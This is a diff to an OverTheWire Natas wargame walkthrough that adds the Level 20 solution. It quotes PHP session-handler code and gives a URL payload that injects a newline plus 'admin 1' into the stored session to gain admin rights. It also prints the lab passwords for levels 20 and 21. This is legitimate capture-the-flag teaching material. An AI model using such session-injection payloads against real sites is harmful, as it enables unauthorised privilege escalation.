@@ -399,11 +399,45 @@ Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
 The password for the level 20 is `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`.
 
-### Level 20 -
+### Level 20 - Custom Session handling
 ```
 http://natas20.natas.labs.overthewire.org/ natas20 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 ```
-``
+Highlights on `myread()` (called by `session_set_save_handler()` and `print_credentials()`:
+```php
+function myread($sid) {
+  $_SESSION = array(); // reset session
+  $data = file_get_contents($filename); // read from /session/my_sess_4678437324
+  // each line is exploded by a space, left side is the key, right side is the value:
+  // key1 value1
+  // key2 value2
+}
+function print_credentials() {
+  if($_SESSION["admin"] == 1)
+    // good boy
+}
+```
+
+OK let's try a simple test to init our session:
+
+[http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love](http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love)
+
+![](/assets/images/2018/12/overthewire-natas20-step-1.png)
+
+And now let's add a newline (URL encoded value `%0A`) and `admin 1`:
+
+[http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love%0Aadmin%201](http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=love%0Aadmin%201)
+
+(You need to load the page twice as we read, then we write) And you should get the following:
+
+![](/assets/images/2018/12/overthewire-natas20-step-2.png)
+
+```bash
+You are an admin. The credentials for the next level are:
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+```
+
 
 ### Level  -
 ```
